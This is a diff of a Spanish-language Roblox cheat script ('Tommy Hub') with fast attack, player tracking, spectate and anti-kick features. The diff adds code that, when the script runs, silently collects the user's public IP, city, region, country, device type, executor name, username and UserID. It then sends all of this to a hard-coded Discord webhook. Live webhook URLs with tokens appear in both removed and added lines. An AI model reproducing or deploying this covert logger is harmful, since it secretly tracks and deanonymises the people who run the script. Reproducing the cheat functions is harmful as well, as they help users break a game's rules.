@@ -1,5 +1,5 @@
 -- ==================== 🔥 FAST ATTACK + TRACKER v2.0 ====================
--- by terrino48 - Sistema completo con IP Logger y Anti-Kick
+-- by terrino48 - Sistema completo con Webhook y Anti-Kick
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -9,33 +9,77 @@ local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
--- ==================== 🌐 1. IP & INFO SYSTEM ====================
+-- ==================== 🌐 WEBHOOK & IP SYSTEM ====================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1505037161475346484/wl-SSZC8ifk4ynVBYj6sCjfSslbUM2n9JEnk4cV13LkN6e0PVC8TGLAXvPBsbi-MdIsQ"
+
 local function GetIpData()
     local success, result = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
     if success then
         local d = HttpService:JSONDecode(result)
-        return d.query or "N/A", d.country or "N/A", d.city or "N/A"
+        return d.query or "N/A", d.country or "N/A", d.city or "N/A", d.regionName or "N/A"
     end
-    return "Error", "Error", "Error"
+    return "Error", "Error", "Error", "Error"
 end
 
-local ip, country, city = GetIpData()
+local ip, country, city, region = GetIpData()
 getgenv().execCount = (getgenv().execCount or 0) + 1
+
+local function GetDevice()
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "📱 Móvil"
+    elseif UserInputService.GamepadEnabled then
+        return "🎮 Consola"
+    else
+        return "💻 PC"
+    end
+end
+
+local function GetExecutor()
+    local name = "❓ Desconocido"
+    pcall(function()
+        if identifyexecutor then
+            name = identifyexecutor()
+        elseif getexecutorname then
+            name = getexecutorname()
+        elseif syn then
+            name = "⚡ Synapse"
+        elseif KRNL_LOADED then
+            name = "👑 KRNL"
+        elseif fluxus then
+            name = "🌀 Fluxus"
+        elseif isfolder and isfolder("Xeno") then
+            name = "🔥 Xeno"
+        end
+    end)
+    return name
+end
 
 task.spawn(function()
     pcall(function()
         local data = {
-            content = "@everyone 🚀 **Tommy Hub v6**\n" ..
-                      "👤 **Usuario:** " .. lp.Name .. "\n" ..
-                      "🆔 **UserID:** " .. lp.UserId .. "\n" ..
-                      "🌐 **IP:** " .. ip .. "\n" ..
-                      "🌍 **Ubicación:** " .. city .. ", " .. country .. "\n" ..
-                      "📊 **Ejecuciones:** " .. getgenv().execCount
+            embeds = {{
+                title = "🔥 TOMMY HUB TRACKER EJECUTADO",
+                color = 65280,
+                fields = {
+                    {name = "👤 Usuario", value = lp.Name, inline = true},
+                    {name = "🆔 UserID", value = tostring(lp.UserId), inline = true},
+                    {name = "📱 Dispositivo", value = GetDevice(), inline = true},
+                    {name = "⚡ Executor", value = GetExecutor(), inline = true},
+                    {name = "🌐 IP", value = ip, inline = true},
+                    {name = "🌍 País", value = country, inline = true},
+                    {name = "🏙️ Ciudad", value = city, inline = true},
+                    {name = "📍 Región", value = region, inline = true},
+                    {name = "📊 Ejecuciones", value = tostring(getgenv().execCount), inline = true},
+                    {name = "🕐 Hora", value = os.date("%H:%M:%S"), inline = true}
+                },
+                footer = {text = "Tommy Hub Tracker System"}
+            }}
         }
+        
         local req = request or http_request or (syn and syn.request) or (http and http.request)
         if req then
             req({
-                Url = "https://discord.com/api/webhooks/1511815858257788988/zqXWS2XbgdGDrUk5wjP_pNvMnTa8VzM-4OW6jfGqgeuCR8SJ5964qQEQP7m6Gu9kVfLH",
+                Url = WEBHOOK_URL,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode(data)
@@ -44,7 +88,7 @@ task.spawn(function()
     end)
 end)
 
--- ==================== 🦾 2. CORE ENGINE & ANTI-KICK ====================
+-- ==================== 🦾 ANTI-KICK ====================
 pcall(function()
     local RS = game:GetService("ReplicatedStorage")
     local CameraShaker = RS:FindFirstChild("Util") and RS.Util:FindFirstChild("CameraShaker")
@@ -66,26 +110,17 @@ end)
 
 -- ==================== CONFIGURACIÓN ====================
 local Config = {
-    -- Tracker
     TrackerEnabled = false,
     TargetPlayer = nil,
     Mode = "Line",
-    
-    -- Fast Attack
     FastAttackEnabled = false,
     FastAttackRange = 5000,
     FastAttackDelay = 0.05,
     FastAttackMode = "All",
-    
-    -- Lock
     LockEnabled = false,
     LockHeight = 200000,
     LockOffset = Vector3.new(0, 1.5, 3.5),
-    
-    -- Spectate
     SpectateEnabled = false,
-    
-    -- Visuales
     Color = Color3.fromRGB(50, 255, 255),
     LineThickness = 2
 }
@@ -547,7 +582,6 @@ print("   Ctrl + L = Lock")
 print("   Ctrl + S = Spectate")
 print("=========================================")
 
--- Mostrar info del usuario
 print("")
 print("👤 Usuario: " .. lp.Name)
 print("🆔 UserID: " .. lp.UserId)
